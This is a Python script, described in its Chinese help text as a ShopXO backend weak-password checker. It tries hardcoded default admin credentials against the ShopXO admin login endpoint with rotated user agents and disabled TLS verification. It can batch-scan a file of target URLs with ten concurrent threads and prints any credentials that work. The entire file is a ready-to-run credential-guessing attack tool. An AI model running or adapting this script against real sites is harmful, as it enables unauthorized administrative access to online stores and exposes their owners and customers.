import requests
import argparse
import concurrent.futures
import random
from requests_toolbelt.multipart.encoder import MultipartEncoder

# 用户代理列表
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    # 可以添加更多用户代理
]


def checkshopxo(url):
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
    }

    user_list = ['admin', 'shopxo']
    pass_list = ['shopxo', '123456', 'admin123', 'shopxo']

    for i in user_list:
        for j in pass_list:
            multipart_data = MultipartEncoder(
                fields={
                    'accounts': i,
                    'pwd': j,
                    'type': 'username'
                },
                boundary='---------------------------' + str(random.randint(1e28, 1e29 - 1))
            )

            headers['Content-Type'] = multipart_data.content_type

            try:
                res = requests.post(f"{url}/admin.php?s=admin/login/system_type/default.html", headers=headers,
                                    data=multipart_data, timeout=5, verify=False)
                if res.status_code == 200 and "登录成功" in res.text:
                    print(f"\033[1;32m[+] {url} Login Success! username:{i}&password:{j}\033[0m")
                    return True
                else:
                    print(f"\033[1;31m[-] {url} Login Failed with username: {i} & password: {j}\033[0m")
            except requests.exceptions.RequestException as e:
                print(f"\033[1;31m[-] {url} 连接出错: {e}\033[0m")

    return False


def banner():
    print("""


                hhhhhhh                                                                                  
                h:::::h                                                                                  
                h:::::h                                                                                  
                h:::::h                                                                                  
    ssssssssss   h::::h hhhhh          ooooooooooo   ppppp   pppppppppxxxxxxx      xxxxxxx ooooooooooo   
  ss::::::::::s  h::::hh:::::hhh     oo:::::::::::oo p::::ppp:::::::::px:::::x    x:::::xoo:::::::::::oo 
ss:::::::::::::s h::::::::::::::hh  o:::::::::::::::op:::::::::::::::::px:::::x  x:::::xo:::::::::::::::o
s::::::ssss:::::sh:::::::hhh::::::h o:::::ooooo:::::opp::::::ppppp::::::px:::::xx:::::x o:::::ooooo:::::o
 s:::::s  ssssss h::::::h   h::::::ho::::o     o::::o p:::::p     p:::::p x::::::::::x  o::::o     o::::o
   s::::::s      h:::::h     h:::::ho::::o     o::::o p:::::p     p:::::p  x::::::::x   o::::o     o::::o
      s::::::s   h:::::h     h:::::ho::::o     o::::o p:::::p     p:::::p  x::::::::x   o::::o     o::::o
ssssss   s:::::s h:::::h     h:::::ho::::o     o::::o p:::::p    p::::::p x::::::::::x  o::::o     o::::o
s:::::ssss::::::sh:::::h     h:::::ho:::::ooooo:::::o p:::::ppppp:::::::px:::::xx:::::x o:::::ooooo:::::o
s::::::::::::::s h:::::h     h:::::ho:::::::::::::::o p::::::::::::::::px:::::x  x:::::xo:::::::::::::::o
 s:::::::::::ss  h:::::h     h:::::h oo:::::::::::oo  p::::::::::::::ppx:::::x    x:::::xoo:::::::::::oo 
  sssssssssss    hhhhhhh     hhhhhhh   ooooooooooo    p::::::pppppppp xxxxxxx      xxxxxxx ooooooooooo   
                                                      p:::::p                                            
                                                      p:::::p                                            
                                                     p:::::::p                                           
                                                     p:::::::p                                           
                                                     p:::::::p                                           
                                                     ppppppppp                                           

                                                                                lpy
                                                                                
    """)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个shopxo后台弱口令检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkshopxo(args.url)
    elif args.file:
        banner()
        with open(args.file, 'r') as f:
            targets = f.read().splitlines()
        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(checkshopxo, targets))
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")